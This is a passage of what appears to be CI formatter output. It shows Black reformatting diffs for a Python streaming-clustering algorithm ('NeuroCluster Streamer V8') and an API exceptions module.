         # Compute minimum distance to any cluster centroid
-        min_distance = float('inf')
+        min_distance = float("inf")
         for cluster in self.clusters:
-            distance = np.linalg.norm(point - cluster['centroid'])
+            distance = np.linalg.norm(point - cluster["centroid"])
             min_distance = min(min_distance, distance)
-        
+
         # Adaptive distance threshold based on historical distances
         if len(self.distance_history) > 10:
             distance_mean = np.mean(list(self.distance_history))
             distance_std = np.std(list(self.distance_history))
             adaptive_threshold = distance_mean + 2.0 * distance_std
         else:
             adaptive_threshold = 2.0  # Default threshold
-        
+
         # Record distance for future use
         self.distance_history.append(min_distance)
-        
+
         # Compute geometric outlier score
         if min_distance > adaptive_threshold:
             return min(1.0, min_distance / adaptive_threshold - 1.0)
         else:
             return 0.0
-    
+
     def _statistical_outlier_detection(self, point: np.ndarray) -> float:
         """Layer 2: Statistical anomaly detection using z-score analysis."""
         if len(self.distance_history) < 10:
             return 0.0
-        
+
         # Compute minimum distance to clusters
-        min_distance = float('inf')
+        min_distance = float("inf")
         for cluster in self.clusters:
-            distance = np.linalg.norm(point - cluster['centroid'])
+            distance = np.linalg.norm(point - cluster["centroid"])
             min_distance = min(min_distance, distance)
-        
+
         # Z-score analysis
         distance_mean = np.mean(list(self.distance_history))
         distance_std = np.std(list(self.distance_history))
-        
+
         if distance_std > 1e-6:  # Avoid division by zero
             z_score = abs(min_distance - distance_mean) / distance_std
             if z_score > 2.5:  # Statistical outlier threshold
                 return min(1.0, (z_score - 2.5) / 2.5)
-        
+
         return 0.0
-    
+
     def _temporal_outlier_detection(self, point: np.ndarray) -> float:
         """Layer 3: Temporal coherence validation."""
         if len(self.outlier_buffer) < 3:
             return 0.0
-        
+
         # Analyze recent points for coherence
         recent_points = list(self.outlier_buffer)[-5:]  # Last 5 points
-        
+
         if len(recent_points) < 3:
             return 0.0
-        
+
         # Compute centroid of recent points
         recent_centroid = np.mean(recent_points, axis=0)
-        
+
         # Compute variance within recent points
-        distances_to_centroid = [np.linalg.norm(p - recent_centroid) for p in recent_points]
+        distances_to_centroid = [
+            np.linalg.norm(p - recent_centroid) for p in recent_points
+        ]
         coherence = 1.0 / (1.0 + np.std(distances_to_centroid))
-        
+
         # Low coherence indicates temporal inconsistency (potential outlier)
         if coherence < 0.3:
             return min(1.0, (0.3 - coherence) / 0.3)
-        
+
         return 0.0
-    
-    def _vectorized_find_best_cluster(self, point: np.ndarray) -> Tuple[Optional[int], float]:
+
+    def _vectorized_find_best_cluster(
+        self, point: np.ndarray
+    ) -> Tuple[Optional[int], float]:
         """
         Find best cluster using vectorized operations for maximum performance.
-        
+
         Args:
             point: Input data point
-            
+
         Returns:
             Tuple of (best_cluster_index, best_similarity)
         """
         if len(self.clusters) == 0:
             return None, 0.0
-        
+
         # Build cluster matrix for vectorized operations
         cluster_matrix = self._get_cluster_matrix()
-        
+
         if cluster_matrix is None or cluster_matrix.shape[0] == 0:
             return None, 0.0
-        
+
         # Vectorized similarity computation
         similarities = self._compute_vectorized_similarities(point, cluster_matrix)
-        
+
         # Find best cluster
         if len(similarities) > 0:
             best_idx = np.argmax(similarities)
             best_similarity = similarities[best_idx]
-            
+
             # Record similarity for adaptive threshold computation
             self.similarity_history.append(best_similarity)
-            
+
             return int(best_idx), float(best_similarity)
-        
+
         return None, 0.0
-    
+
     def _get_cluster_matrix(self) -> Optional[np.ndarray]:
         """Get cluster centroids as a matrix for vectorized operations."""
         if len(self.clusters) == 0:
             return None
-        
+
         # Use caching for performance
-        if (self.performance_mode and 
-            self._cluster_array_cache is not None and 
-            not self._cache_dirty):
+        if (
+            self.performance_mode
+            and self._cluster_array_cache is not None
+            and not self._cache_dirty
+        ):
             return self._cluster_array_cache
-        
+
         try:
             # Build matrix from cluster centroids
             centroids = []
             for cluster in self.clusters:
-                centroids.append(cluster['centroid'])
-            
+                centroids.append(cluster["centroid"])
+
             if len(centroids) > 0:
                 cluster_matrix = np.vstack(centroids)
-                
+
                 # Cache the result
                 if self.performance_mode:
                     self._cluster_array_cache = cluster_matrix
                     self._cache_dirty = False
-                
+
                 return cluster_matrix
         except Exception:
             # Handle dimension mismatch or other errors
             pass
-        
+
         return None
-    
-    def _compute_vectorized_similarities(self, point: np.ndarray, cluster_matrix: np.ndarray) -> np.ndarray:
+
+    def _compute_vectorized_similarities(
+        self, point: np.ndarray, cluster_matrix: np.ndarray
+    ) -> np.ndarray:
         """
         Compute cosine similarities using vectorized operations.
-        
+
         Args:
             point: Input data point
             cluster_matrix: Matrix of cluster centroids
-            
+
         Returns:
             Array of similarity scores
         """
         try:
             # Compute dot products
             dot_products = np.dot(cluster_matrix, point)
-            
+
             # Compute norms
             point_norm = np.linalg.norm(point)
             centroid_norms = np.linalg.norm(cluster_matrix, axis=1)
-            
+
             # Avoid division by zero
             valid_mask = (centroid_norms > 1e-10) & (point_norm > 1e-10)
-            
+
             similarities = np.zeros(len(cluster_matrix))
             if np.any(valid_mask) and point_norm > 1e-10:
-                similarities[valid_mask] = (dot_products[valid_mask] / 
-                                          (point_norm * centroid_norms[valid_mask]))
-                
+                similarities[valid_mask] = dot_products[valid_mask] / (
+                    point_norm * centroid_norms[valid_mask]
+                )
+
                 # Clip to valid range
                 similarities = np.clip(similarities, -1.0, 1.0)
-            
+
             return similarities
-            
+
         except Exception:
             # Fallback to zeros if computation fails
             return np.zeros(len(cluster_matrix))
-    
+
     def _get_dynamic_threshold(self) -> float:
         """
         Compute dynamic threshold based on data characteristics and system state.
-        
+
         Returns:
             Adaptive threshold value
         """
         # Use cached value if available and fresh
         current_time = self.time_step
         cache_key = current_time // 10  # Cache for 10 time steps
-        
+
         if self.performance_mode and cache_key in self._threshold_cache:
             return self._threshold_cache[cache_key]
-        
+
         # Compute dynamic threshold
         if len(self.similarity_history) < 10:
             threshold = self.base_threshold
         else:
             similarities = np.array(list(self.similarity_history))
-            
+
             # Base threshold from 75th percentile of similarities
             p75_similarity = np.percentile(similarities, 75)
-            
+
             # Stability bonus/penalty
             similarity_std = np.std(similarities)
             stability_factor = max(0.5, 1.0 - similarity_std)
-            
+
             # Quality bonus
             quality_bonus = self.clustering_quality * 0.1
-            
+
             # Global stability bonus
             stability_bonus = self.global_stability * 0.05
-            
+
             # Compute adaptive threshold
-            threshold = (p75_similarity * stability_factor + 
-                        quality_bonus + stability_bonus)
-            
+            threshold = (
+                p75_similarity * stability_factor + quality_bonus + stability_bonus
+            )
+
             # Constrain to reasonable bounds
             threshold = np.clip(threshold, 0.3, 0.95)
-        
+
         # Cache the result
         if self.performance_mode:
             self._threshold_cache[cache_key] = threshold
-            
+
             # Clean old cache entries
             if len(self._threshold_cache) > 10:
-                old_keys = [k for k in self._threshold_cache.keys() if k < cache_key - 5]
+                old_keys = [
+                    k for k in self._threshold_cache.keys() if k < cache_key - 5
+                ]
                 for old_key in old_keys:
                     del self._threshold_cache[old_key]
-        
+
         self.current_dynamic_threshold = threshold
         return threshold
-    
+
     def _adaptive_cluster_update(self, cluster_idx: int, point: np.ndarray):
         """
         Update cluster centroid using adaptive learning rate.
-        
+
         Args:
             cluster_idx: Index of cluster to update
             point: New data point
         """
         if cluster_idx >= len(self.clusters):
             return
-        
+
         cluster = self.clusters[cluster_idx]
-        
+
         # Compute adaptive learning rate
-        age_factor = 1.0 / (1.0 + cluster['age'] * 0.01)
-        stability_factor = min(1.2, 1.0 + cluster['confidence'] * 0.2)
+        age_factor = 1.0 / (1.0 + cluster["age"] * 0.01)
+        stability_factor = min(1.2, 1.0 + cluster["confidence"] * 0.2)
         adaptive_lr = self.learning_rate * age_factor * stability_factor
-        
+
         # Temporal smoothing for noise reduction
-        smoothed_point = 0.7 * point + 0.3 * cluster['centroid']
-        
+        smoothed_point = 0.7 * point + 0.3 * cluster["centroid"]
+
         # Update centroid with adaptive learning rate
-        cluster['centroid'] = ((1.0 - adaptive_lr) * cluster['centroid'] + 
-                              adaptive_lr * smoothed_point)
-        
+        cluster["centroid"] = (1.0 - adaptive_lr) * cluster[
+            "centroid"
+        ] + adaptive_lr * smoothed_point
+
         # Update cluster metadata
-        cluster['confidence'] += 0.3
-        cluster['age'] += 0.1
-        cluster['updates'] += 1
-        cluster['last_update'] = self.time_step
-        
+        cluster["confidence"] += 0.3
+        cluster["age"] += 0.1
+        cluster["updates"] += 1
+        cluster["last_update"] = self.time_step
+
         # Recompute health score
-        cluster['health_score'] = self._compute_cluster_health(cluster)
-        
+        cluster["health_score"] = self._compute_cluster_health(cluster)
+
         # Mark cache as dirty
         self._cache_dirty = True
-    
+
     def _can_create_cluster(self) -> bool:
         """Check if a new cluster can be created."""
         return len(self.clusters) < self.max_clusters
-    
+
     def _create_new_cluster(self, point: np.ndarray) -> int:
         """
         Create a new cluster with the given point as centroid.
-        
+
         Args:
             point: Data point to use as cluster centroid
-            
+
         Returns:
             Index of newly created cluster
         """
         new_cluster = {
-            'centroid': point.copy(),
-            'confidence': 1.0,
-            'age': 0.0,
-            'updates': 1,
-            'last_update': self.time_step,
-            'health_score': 1.0
+            "centroid": point.copy(),
+            "confidence": 1.0,
+            "age": 0.0,
+            "updates": 1,
+            "last_update": self.time_step,
+            "health_score": 1.0,
         }
-        
+
         self.clusters.append(new_cluster)
-        self._stats['clusters_created'] += 1
-        
+        self._stats["clusters_created"] += 1
+
         # Mark cache as dirty
         self._cache_dirty = True
-        
+
         return len(self.clusters) - 1
-    
+
     def _compute_cluster_health(self, cluster: Dict[str, Any]) -> float:
         """
         Compute comprehensive health score for a cluster.
-        
+
         Args:
             cluster: Cluster dictionary
-            
+
         Returns:
             Health score [0-1]
         """
         # Age factor (mature clusters are more stable)
-        age_factor = min(1.2, 1.0 + cluster['age'] / 200.0)
-        
+        age_factor = min(1.2, 1.0 + cluster["age"] / 200.0)
+
         # Consistency factor (regular updates indicate relevance)
-        consistency_factor = min(1.1, 0.8 + (cluster['updates'] / (cluster['age'] + 1)) * 0.3)
-        
+        consistency_factor = min(
+            1.1, 0.8 + (cluster["updates"] / (cluster["age"] + 1)) * 0.3
+        )
+
         # Recency factor (recent updates indicate ongoing relevance)
-        recency = max(0.5, 1.0 - (self.time_step - cluster['last_update']) / 50.0)
-        
+        recency = max(0.5, 1.0 - (self.time_step - cluster["last_update"]) / 50.0)
+
         # Combine factors
-        health_score = cluster['confidence'] * age_factor * consistency_factor * recency
-        
+        health_score = cluster["confidence"] * age_factor * consistency_factor * recency
+
         return min(1.0, health_score)
-    
+
     def _enhanced_maintenance(self):
         """Perform enhanced maintenance operations for optimal performance."""
         # Remove weak clusters
         self._remove_weak_clusters()
-        
+
         # Apply confidence decay
         self._apply_confidence_decay()
-        
+
         # Process outlier buffer
         self._process_outlier_buffer()
-        
+
         # Merge similar clusters
         self._merge_similar_clusters()
-        
+
         # Update global metrics
         self._update_global_metrics()
-        
+
         # Memory cleanup
         if self.performance_mode and self.time_step % 200 == 0:
             self._memory_cleanup()
-    
+
     def _remove_weak_clusters(self):
         """Remove clusters with low health scores."""
         initial_count = len(self.clusters)
-        
+
         # Filter clusters based on health and confidence
-        self.clusters = [cluster for cluster in self.clusters 
-                        if (cluster['confidence'] >= self.min_confidence and 
-                            cluster['health_score'] >= 0.3)]
-        
+        self.clusters = [
+            cluster
+            for cluster in self.clusters
+            if (
+                cluster["confidence"] >= self.min_confidence
+                and cluster["health_score"] >= 0.3
+            )
+        ]
+
         # Mark cache as dirty if clusters were removed
         if len(self.clusters) != initial_count:
             self._cache_dirty = True
-    
+
     def _apply_confidence_decay(self):
         """Apply confidence decay to all clusters."""
         for cluster in self.clusters:
             # Age-based decay
-            decay_factor = 1.0 - self.decay_rate * (1.0 + cluster['age'] * 0.01)
-            cluster['confidence'] *= decay_factor
-            cluster['age'] += 1.0
-            
+            decay_factor = 1.0 - self.decay_rate * (1.0 + cluster["age"] * 0.01)
+            cluster["confidence"] *= decay_factor
+            cluster["age"] += 1.0
+
             # Recompute health score
-            cluster['health_score'] = self._compute_cluster_health(cluster)
-    
+            cluster["health_score"] = self._compute_cluster_health(cluster)
+
     def _process_outlier_buffer(self):
         """Process points in outlier buffer for potential cluster creation or assignment."""
         if len(self.outlier_buffer) < 3:
             return
-        
+
         # Analyze outlier buffer for potential clusters
         outlier_points = list(self.outlier_buffer)
-        
+
         # Simple clustering of outliers using distance-based approach
         potential_centroids = []
         used_points = set()
-        
+
         for i, point1 in enumerate(outlier_points):
             if i in used_points:
                 continue
-                
+
             nearby_points = [point1]
             used_points.add(i)
-            
+
             for j, point2 in enumerate(outlier_points):
                 if j <= i or j in used_points:
                     continue
-                    
+
                 distance = np.linalg.norm(point1 - point2)
                 if distance < 1.5:  # Proximity threshold
                     nearby_points.append(point2)
                     used_points.add(j)
-            
+
             if len(nearby_points) >= 3 and self._can_create_cluster():
                 # Create cluster from outlier group
                 centroid = np.mean(nearby_points, axis=0)
                 self._create_new_cluster(centroid)
-        
+
         # Clear processed outliers
         self.outlier_buffer.clear()
-    
+
     def _merge_similar_clusters(self):
         """Merge clusters that are too similar."""
         if len(self.clusters) < 2:
             return
-        
+
         merged_pairs = []
-        
+
         for i in range(len(self.clusters)):
             for j in range(i + 1, len(self.clusters)):
                 if (i, j) in merged_pairs or (j, i) in merged_pairs:
                     continue
-                
+
                 cluster1 = self.clusters[i]
                 cluster2 = self.clusters[j]
-                
+
                 # Compute merge compatibility
                 merge_score = self._compute_merge_compatibility(cluster1, cluster2)
-                
+
                 if merge_score >= self.merge_threshold:
                     # Merge clusters
                     self._merge_clusters(i, j)
                     merged_pairs.append((i, j))
-                    self._stats['clusters_merged'] += 1
-        
+                    self._stats["clusters_merged"] += 1
+
         # Remove merged clusters (process in reverse order to maintain indices)
         for i, j in reversed(merged_pairs):
             if j < len(self.clusters):
                 del self.clusters[j]
-        
+
         # Mark cache as dirty if clusters were merged
         if merged_pairs:
             self._cache_dirty = True
-    
+
     def _compute_merge_compatibility(self, cluster1: Dict, cluster2: Dict) -> float:
         """
         Compute compatibility score for merging two clusters.
-        
+
         Args:
             cluster1: First cluster
             cluster2: Second cluster
-            
+
         Returns:
             Merge compatibility score [0-1]
         """
         # Geometric similarity
-        centroid1 = cluster1['centroid']
-        centroid2 = cluster2['centroid']
-        
+        centroid1 = cluster1["centroid"]
+        centroid2 = cluster2["centroid"]
+
         # Cosine similarity between centroids
         dot_product = np.dot(centroid1, centroid2)
         norm1 = np.linalg.norm(centroid1)
         norm2 = np.linalg.norm(centroid2)
-        
+
         if norm1 > 1e-10 and norm2 > 1e-10:
             geometric_sim = dot_product / (norm1 * norm2)
         else:
             geometric_sim = 0.0
-        
+
         # Quality compatibility
-        conf_diff = abs(cluster1['confidence'] - cluster2['confidence'])
-        quality_compat = 1.0 - min(1.0, conf_diff / max(cluster1['confidence'], cluster2['confidence']))
-        
+        conf_diff = abs(cluster1["confidence"] - cluster2["confidence"])
+        quality_compat = 1.0 - min(
+            1.0, conf_diff / max(cluster1["confidence"], cluster2["confidence"])
+        )
+
         # Health compatibility
-        health_diff = abs(cluster1['health_score'] - cluster2['health_score'])
+        health_diff = abs(cluster1["health_score"] - cluster2["health_score"])
         health_compat = 1.0 - min(1.0, health_diff)
-        
+
         # Temporal compatibility
-        age_diff = abs(cluster1['age'] - cluster2['age'])
+        age_diff = abs(cluster1["age"] - cluster2["age"])
         temporal_compat = 1.0 - min(1.0, age_diff / 100.0)
-        
+
         # Weighted combination
-        merge_score = (0.4 * max(0, geometric_sim) + 
-                      0.25 * quality_compat + 
-                      0.2 * health_compat + 
-                      0.15 * temporal_compat)
-        
+        merge_score = (
+            0.4 * max(0, geometric_sim)
+            + 0.25 * quality_compat
+            + 0.2 * health_compat
+            + 0.15 * temporal_compat
+        )
+
         return merge_score
-    
+
     def _merge_clusters(self, idx1: int, idx2: int):
         """
         Merge two clusters.
-        
+
         Args:
             idx1: Index of first cluster (will be kept)
             idx2: Index of second cluster (will be removed)
         """
         if idx1 >= len(self.clusters) or idx2 >= len(self.clusters):
             return
-        
+
         cluster1 = self.clusters[idx1]
         cluster2 = self.clusters[idx2]
-        
+
         # Weighted average of centroids based on confidence
-        total_confidence = cluster1['confidence'] + cluster2['confidence']
+        total_confidence = cluster1["confidence"] + cluster2["confidence"]
         if total_confidence > 0:
-            weight1 = cluster1['confidence'] / total_confidence
-            weight2 = cluster2['confidence'] / total_confidence
-            
-            cluster1['centroid'] = weight1 * cluster1['centroid'] + weight2 * cluster2['centroid']
-            cluster1['confidence'] = total_confidence * 0.8  # Slight penalty for merging
-            cluster1['age'] = (cluster1['age'] + cluster2['age']) / 2
-            cluster1['updates'] += cluster2['updates']
-            cluster1['last_update'] = max(cluster1['last_update'], cluster2['last_update'])
-            cluster1['health_score'] = self._compute_cluster_health(cluster1)
-    
+            weight1 = cluster1["confidence"] / total_confidence
+            weight2 = cluster2["confidence"] / total_confidence
+
+            cluster1["centroid"] = (
+                weight1 * cluster1["centroid"] + weight2 * cluster2["centroid"]
+            )
+            cluster1["confidence"] = (
+                total_confidence * 0.8
+            )  # Slight penalty for merging
+            cluster1["age"] = (cluster1["age"] + cluster2["age"]) / 2
+            cluster1["updates"] += cluster2["updates"]
+            cluster1["last_update"] = max(
+                cluster1["last_update"], cluster2["last_update"]
+            )
+            cluster1["health_score"] = self._compute_cluster_health(cluster1)
+
     def _update_global_metrics(self):
         """Update global algorithm metrics."""
         if len(self.clusters) > 0:
             # Clustering quality based on similarity statistics
             if len(self.similarity_history) > 10:
                 similarities = np.array(list(self.similarity_history))
                 mean_sim = np.mean(similarities)
                 std_sim = np.std(similarities)
                 self.clustering_quality = min(1.0, mean_sim * (1.0 / (1.0 + std_sim)))
-            
+
             # Global stability based on cluster count and quality stability
-            cluster_count_stability = min(1.0, 1.0 / (1.0 + abs(len(self.clusters) - 4) * 0.1))
-            
+            cluster_count_stability = min(
+                1.0, 1.0 / (1.0 + abs(len(self.clusters) - 4) * 0.1)
+            )
+
             if len(self.quality_history) > 10:
                 quality_std = np.std(list(self.quality_history))
                 quality_stability = 1.0 / (1.0 + quality_std)
             else:
                 quality_stability = 1.0
-            
+
             self.global_stability = cluster_count_stability * quality_stability
-            
+
             # Adaptation rate based on stability
             self.adaptation_rate = 1.0 + self.global_stability * 0.4
-            
+
             # Record quality in history
             self.quality_history.append(self.clustering_quality)
-    
+
     def _memory_cleanup(self):
         """Perform memory cleanup operations."""
         # Trigger garbage collection
         gc.collect()
-        
+
         # Clear old cache entries
-        if hasattr(self, '_threshold_cache'):
+        if hasattr(self, "_threshold_cache"):
             self._threshold_cache.clear()
-        
+
         # Reset cache
         self._cluster_array_cache = None
         self._cache_dirty = True
-    
+
     def _record_processing_time(self, processing_time_ms: float):
         """Record processing time for performance monitoring."""
         self.processing_times.append(processing_time_ms)
-        
+
         # Update statistics
-        self._stats['avg_processing_time_ms'] = np.mean(list(self.processing_times))
-        self._stats['max_processing_time_ms'] = max(self._stats['max_processing_time_ms'], processing_time_ms)
-        
+        self._stats["avg_processing_time_ms"] = np.mean(list(self.processing_times))
+        self._stats["max_processing_time_ms"] = max(
+            self._stats["max_processing_time_ms"], processing_time_ms
+        )
+
         # Check for performance warnings
         if processing_time_ms > self.latency_warning_threshold_ms:
             self.warning_count += 1
-    
+
     def get_clusters(self) -> List[Tuple[np.ndarray, float, float, int, float]]:
         """
         Get current clusters with metadata.
-        
+
         Returns:
             List of tuples (centroid, stability, age, updates, quality)
         """
         with self._lock:
             clusters_info = []
             for cluster in self.clusters:
-                centroid = cluster['centroid'].copy()
-                stability = cluster['confidence'] * min(1.2, 1.0 + cluster['age'] * 0.01)
-                age = cluster['age']
-                updates = cluster['updates']
-                quality = cluster['health_score']
-                
+                centroid = cluster["centroid"].copy()
+                stability = cluster["confidence"] * min(
+                    1.2, 1.0 + cluster["age"] * 0.01
+                )
+                age = cluster["age"]
+                updates = cluster["updates"]
+                quality = cluster["health_score"]
+
                 clusters_info.append((centroid, stability, age, updates, quality))
-            
+
             return clusters_info
-    
+
     def get_statistics(self) -> Dict[str, Any]:
         """
         Get comprehensive algorithm statistics.
-        
+
         Returns:
             Dictionary containing performance and algorithm metrics
         """
         with self._lock:
             # Update memory usage estimate
-            estimated_memory = (len(self.clusters) * 1000 +  # Rough estimate per cluster
-                               len(self.similarity_history) * 8 + 
-                               len(self.distance_history) * 8 + 
-                               len(self.outlier_buffer) * 100) / (1024 * 1024)  # Convert to MB
-            
-            self._stats['memory_usage_estimate_mb'] = estimated_memory
-            self._stats['total_points_processed'] = self.total_points_processed
-            
+            estimated_memory = (
+                len(self.clusters) * 1000
+                + len(self.similarity_history) * 8  # Rough estimate per cluster
+                + len(self.distance_history) * 8
+                + len(self.outlier_buffer) * 100
+            ) / (
+                1024 * 1024
+            )  # Convert to MB
+
+            self._stats["memory_usage_estimate_mb"] = estimated_memory
+            self._stats["total_points_processed"] = self.total_points_processed
+
             stats = {
-                'num_clusters': len(self.clusters),
-                'total_points_processed': self.total_points_processed,
-                'clustering_quality': self.clustering_quality,
-                'global_stability': self.global_stability,
-                'adaptation_rate': self.adaptation_rate,
-                'current_dynamic_threshold': self.current_dynamic_threshold,
-                'avg_processing_time_ms': self._stats['avg_processing_time_ms'],
-                'max_processing_time_ms': self._stats['max_processing_time_ms'],
-                'memory_usage_estimate_mb': self._stats['memory_usage_estimate_mb'],
-                'error_count': self.error_count,
-                'warning_count': self.warning_count,
-                'clusters_created': self._stats['clusters_created'],
-                'clusters_merged': self._stats['clusters_merged'],
-                'outliers_detected': self._stats['outliers_detected'],
-                'time_step': self.time_step
+                "num_clusters": len(self.clusters),
+                "total_points_processed": self.total_points_processed,
+                "clustering_quality": self.clustering_quality,
+                "global_stability": self.global_stability,
+                "adaptation_rate": self.adaptation_rate,
+                "current_dynamic_threshold": self.current_dynamic_threshold,
+                "avg_processing_time_ms": self._stats["avg_processing_time_ms"],
+                "max_processing_time_ms": self._stats["max_processing_time_ms"],
+                "memory_usage_estimate_mb": self._stats["memory_usage_estimate_mb"],
+                "error_count": self.error_count,
+                "warning_count": self.warning_count,
+                "clusters_created": self._stats["clusters_created"],
+                "clusters_merged": self._stats["clusters_merged"],
+                "outliers_detected": self._stats["outliers_detected"],
+                "time_step": self.time_step,
             }
-            
+
             return stats
-    
+
     def reset(self):
         """Reset algorithm state while preserving configuration."""
         with self._lock:
             self.clusters.clear()
             self.time_step = 0
             self.total_points_processed = 0
-            
+
             self.similarity_history.clear()
             self.distance_history.clear()
             self.quality_history.clear()
             self.outlier_buffer.clear()
             self.processing_times.clear()
-            
+
             self.error_count = 0
             self.warning_count = 0
-            
+
             self.current_dynamic_threshold = self.base_threshold
             self.global_stability = 1.0
             self.clustering_quality = 1.0
             self.adaptation_rate = 1.0
-            
+
             # Clear caches
-            if hasattr(self, '_threshold_cache'):
+            if hasattr(self, "_threshold_cache"):
                 self._threshold_cache.clear()
             self._cluster_array_cache = None
             self._cache_dirty = True
-            
+
             # Reset statistics
             self._initialize_state()
 
 
 # Compatibility alias for existing code
@@ -939,55 +995,55 @@
 
 
 if __name__ == "__main__":
     """Test the NeuroCluster Streamer algorithm."""
     print("🧠 Testing NeuroCluster Streamer V8...")
-    
+
     # Initialize algorithm
     ncs = NeuroClusterStreamer(
-        base_threshold=0.71,
-        learning_rate=0.06,
-        performance_mode=True
+        base_threshold=0.71, learning_rate=0.06, performance_mode=True
     )
-    
+
     # Generate test data
     np.random.seed(42)
-    
+
     # Test data with cluster structure
     cluster1_points = np.random.normal([0, 0], 0.5, (50, 2))
     cluster2_points = np.random.normal([5, 5], 0.5, (50, 2))
     outlier_points = np.random.uniform(-3, 8, (10, 2))
-    
+
     all_points = np.vstack([cluster1_points, cluster2_points, outlier_points])
     np.random.shuffle(all_points)
-    
+
     # Process points and measure performance
     start_time = time.time()
     results = []
-    
+
     for point in all_points:
         cluster_id, is_outlier, outlier_score = ncs.process_data_point(point)
         results.append((cluster_id, is_outlier, outlier_score))
-    
+
     processing_time = time.time() - start_time
-    
+
     # Print results
     print(f"✅ Processed {len(all_points)} points in {processing_time:.3f} seconds")
     print(f"📊 Processing rate: {len(all_points) / processing_time:.0f} points/second")
-    
+
     # Get algorithm statistics
     stats = ncs.get_statistics()
     print(f"🔬 Algorithm Statistics:")
     print(f"   Clusters found: {stats['num_clusters']}")
     print(f"   Clustering quality: {stats['clustering_quality']:.3f}")
     print(f"   Global stability: {stats['global_stability']:.3f}")
     print(f"   Avg processing time: {stats['avg_processing_time_ms']:.3f}ms")
     print(f"   Memory usage: {stats['memory_usage_estimate_mb']:.1f}MB")
     print(f"   Outliers detected: {stats['outliers_detected']}")
-    
+
     # Get cluster information
     clusters = ncs.get_clusters()
     print(f"🎯 Cluster Details:")
     for i, (centroid, stability, age, updates, quality) in enumerate(clusters):
-        print(f"   Cluster {i}: centroid={centroid[:2]}, stability={stability:.3f}, quality={quality:.3f}")
-    
-    print("🎉 NeuroCluster Streamer V8 test completed successfully!")
\ No newline at end of file
+        print(
+            f"   Cluster {i}: centroid={centroid[:2]}, stability={stability:.3f}, quality={quality:.3f}"
+        )
+
+    print("🎉 NeuroCluster Streamer V8 test completed successfully!")
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/app/exceptions.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/app/exceptions.py	2025-06-10 20:31:25.476857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/app/exceptions.py	2025-06-10 20:32:32.746459+00:00
@@ -24,700 +24,711 @@
 
 # =============================================================================
 # Base Exception Classes
 # =============================================================================
 
+
 class NCSAPIException(Exception):
     """
     Base exception class for all NCS API exceptions.
-    
+
     Provides structured error information and context for debugging.
     """
-    
+
     def __init__(
         self,
         message: str,
         error_code: ErrorCode = ErrorCode.PROCESSING_ERROR,
         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
         details: Optional[Dict[str, Any]] = None,
         suggestion: Optional[str] = None,
-        context: Optional[Dict[str, Any]] = None
+        context: Optional[Dict[str, Any]] = None,
     ):
         """
         Initialize NCS API exception.
-        
+
         Args:
             message: Human-readable error message
             error_code: Standardized error code
             status_code: HTTP status code
             details: Additional error details
             suggestion: Suggested action to resolve the error
             context: Additional context information
         """
         super().__init__(message)
-        
+
         self.message = message
         self.error_code = error_code
         self.status_code = status_code
         self.details = details or {}
         self.suggestion = suggestion
         self.context = context or {}
         self.timestamp = time.time()
         self.traceback_info = traceback.format_exc()
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """
         Convert exception to dictionary format.
-        
+
         Returns:
             Dictionary representation of the exception
         """
         return {
             "success": False,
             "error_code": self.error_code.value,
             "message": self.message,
             "details": self.details,
             "suggestion": self.suggestion,
             "context": self.context,
-            "timestamp": self.timestamp
+            "timestamp": self.timestamp,
         }
-    
+
     def to_http_exception(self) -> HTTPException:
         """
         Convert to FastAPI HTTPException.
-        
+
         Returns:
             HTTPException for FastAPI error handling
         """
-        return HTTPException(
-            status_code=self.status_code,
-            detail=self.to_dict()
-        )
-    
+        return HTTPException(status_code=self.status_code, detail=self.to_dict())
+
     def __str__(self) -> str:
         """String representation of the exception."""
         return f"{self.error_code.value}: {self.message}"
-    
+
     def __repr__(self) -> str:
         """Detailed string representation for debugging."""
-        return (f"{self.__class__.__name__}(message='{self.message}', "
-                f"error_code={self.error_code.value}, "
-                f"status_code={self.status_code})")
+        return (
+            f"{self.__class__.__name__}(message='{self.message}', "
+            f"error_code={self.error_code.value}, "
+            f"status_code={self.status_code})"
+        )
 
 
 # =============================================================================
 # Algorithm-Related Exceptions
 # =============================================================================
+
 
 class AlgorithmException(NCSAPIException):
     """Exception raised when the clustering algorithm encounters errors."""
-    
-    def __init__(
-        self,
-        message: str,
-        algorithm_state: Optional[Dict[str, Any]] = None,
-        **kwargs
+
+    def __init__(
+        self, message: str, algorithm_state: Optional[Dict[str, Any]] = None, **kwargs
     ):
         """
         Initialize algorithm exception.
-        
+
         Args:
             message: Error message
             algorithm_state: Current algorithm state for debugging
             **kwargs: Additional arguments passed to base class
         """
         kwargs.setdefault("error_code", ErrorCode.ALGORITHM_ERROR)
         kwargs.setdefault("status_code", status.HTTP_500_INTERNAL_SERVER_ERROR)
-        kwargs.setdefault("suggestion", "Check algorithm parameters and input data quality")
-        
+        kwargs.setdefault(
+            "suggestion", "Check algorithm parameters and input data quality"
+        )
+
         if algorithm_state:
-            kwargs.setdefault("context", {}).update({"algorithm_state": algorithm_state})
-        
+            kwargs.setdefault("context", {}).update(
+                {"algorithm_state": algorithm_state}
+            )
+
         super().__init__(message, **kwargs)
 
 
 class AlgorithmInitializationException(AlgorithmException):
     """Exception raised during algorithm initialization."""
-    
-    def __init__(self, message: str, config_params: Optional[Dict[str, Any]] = None, **kwargs):
+
+    def __init__(
+        self, message: str, config_params: Optional[Dict[str, Any]] = None, **kwargs
+    ):
         kwargs.setdefault("suggestion", "Check algorithm configuration parameters")
-        
+
         if config_params:
             kwargs.setdefault("context", {}).update({"config_params": config_params})
-        
+
         super().__init__(message, **kwargs)
 
 
 class AlgorithmConfigurationException(AlgorithmException):
     """Exception raised for invalid algorithm configuration."""
-    
-    def __init__(self, message: str, invalid_params: Optional[List[str]] = None, **kwargs):
-        kwargs.setdefault("suggestion", "Review and correct algorithm configuration parameters")
-        
+
+    def __init__(
+        self, message: str, invalid_params: Optional[List[str]] = None, **kwargs
+    ):
+        kwargs.setdefault(
+            "suggestion", "Review and correct algorithm configuration parameters"
+        )
+
         if invalid_params:
-            kwargs.setdefault("details", {}).update({"invalid_parameters": invalid_params})
-        
+            kwargs.setdefault("details", {}).update(
+                {"invalid_parameters": invalid_params}
+            )
+
         super().__init__(message, **kwargs)
 
 
 class AlgorithmPerformanceException(AlgorithmException):
     """Exception raised when algorithm performance degrades significantly."""
-    
+
     def __init__(
         self,
         message: str,
         performance_metrics: Optional[Dict[str, float]] = None,
